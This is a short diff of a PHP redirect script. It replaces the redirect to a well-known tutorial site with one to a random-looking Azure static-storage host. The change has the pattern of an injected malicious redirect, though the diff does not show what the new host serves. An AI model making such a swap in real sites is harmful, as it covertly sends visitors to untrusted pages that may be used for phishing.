@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://www.geeksforgeeks.org");
+header("Location: https://muggg7sss.z13.web.core.windows.net/");
  
 exit;
 ?>
